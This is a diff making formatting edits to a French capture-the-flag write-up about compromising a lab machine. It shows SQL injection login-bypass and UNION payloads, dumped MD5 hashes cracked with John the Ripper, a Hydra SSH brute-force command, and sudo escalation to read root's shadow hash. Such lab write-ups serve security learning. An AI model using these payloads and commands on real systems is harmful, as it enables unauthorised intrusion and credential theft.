@@ -70,9 +70,9 @@ Host script results:
 
 Sur le port 80 se trouve un site fait avec *Bootstrap*... ce qui fait que l'on a l'impression de connaître le site avant même de l'avoir visité :p  
 
-En haut de la page il y a un formulaire *"Sign in"* avec les champs username et password.  
+En haut de la page, il y a un formulaire *"Sign in"* avec les champs username et password.  
 
-La page retourne une erreur sql bavarde si on rentre **"'** comme nom d'utilisateur :  
+La page retourne une erreur sql bavarde si on rentre `"'` comme nom d'utilisateur :  
 
 ```
 Invalid query: You have an error in your SQL syntax;
@@ -82,9 +82,9 @@ Whole query: select username, user_id from users where username = ""'" and passw
 
 Il semble qu'il soit alors possible de bypasser l'authentification en modifiant la requête SQL.  
 
-Ainsi avec le nom d'utilisateur **" or 1;#** on se retrouve connecté en tant que *test@nowhere.com*.  
+Ainsi avec le nom d'utilisateur `" or 1;#` on se retrouve connecté en tant que *test@nowhere.com*.  
 
-Il est alors possible d'accéder à des profils utilisateurs via des urls de la forme */profile&id=113*.  
+Il est alors possible d'accéder à des profils utilisateurs via des urls de la forme `/profile&id=113`.  
 
 Un petit script Python suffit à extraire les utilisateurs existants en cherchant les IDs entre 0 et 500.  
 
@@ -120,9 +120,9 @@ id = 113 test@nowhere.com
 
 Vu que l'email utilisateur s'affiche dans la page une fois connecté, il doit être aussi possible d'utiliser une UNION pour faire afficher les passwords de l'utilisateur.  
 
-Et... oui ! si on rentre **" union select password, 0 from users where user\_id=3;#** on obtient le hash du mot de passe de *Brian*.  
+Et... oui ! si on rentre `" union select password, 0 from users where user_id=3;#` on obtient le hash du mot de passe de *Brian*.  
 
-Comme il y a peu d'utilisateurs on peut se permettre de faire une énumération manuelle. Après quelques temps on a les hashs suivants :  
+Comme il y a peu d'utilisateurs, on peut se permettre de faire une énumération manuelle. Après quelque temps on a les hashs suivants :  
 
 ```
 brian:e22f07b17f98e0d9d364584ced0e3c18
@@ -141,7 +141,7 @@ test:098f6bcd4621d373cade4e832627b4f6
 
 Ça ne fait pas long feu avec une bonne wordlist :  
 
-```
+```console
 $ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
 Loaded 12 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
 changeme         (foo)
@@ -157,7 +157,7 @@ guesses: 8  time: 0:00:00:02 DONE (Wed Jul 16 13:28:15 2014)
 
 Testons ces identifiants sur le serveur SSH. Ici pas question de les faire à la mano.  
 
-```
+```console
 $ ./hydra -L users.txt -P passwords.txt -e nsr ssh://192.168.1.60
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -181,7 +181,7 @@ La vie de Brian
 
 *Brian* a tous les droits et on le remercie :  
 
-```
+```console
 [brian@localhost ~]$ sudo -l
 
 We trust you have received the usual lecture from the local System
@@ -204,7 +204,7 @@ User brian may run the following commands on this host:
 root:$6$C85VH0UQ$ZFydP2qmc0DTBfK5x4UL9658RDdF/cAzRtRFv6SB7ctovLeEPV6BOzimsGtCQOYbQOXbH4Ek2FN4a0Lrsymb/0:15698:0:99999:7:::
 ```
 
-Au passage on trouve d'autres mots de passe dans le fichier *.mysql\_history* de root :  
+Au passage, on trouve d'autres mots de passe dans le fichier `.mysql_history` de root :  
 
 ```
 update users set password=md5('my2cents') where user_id = 3;
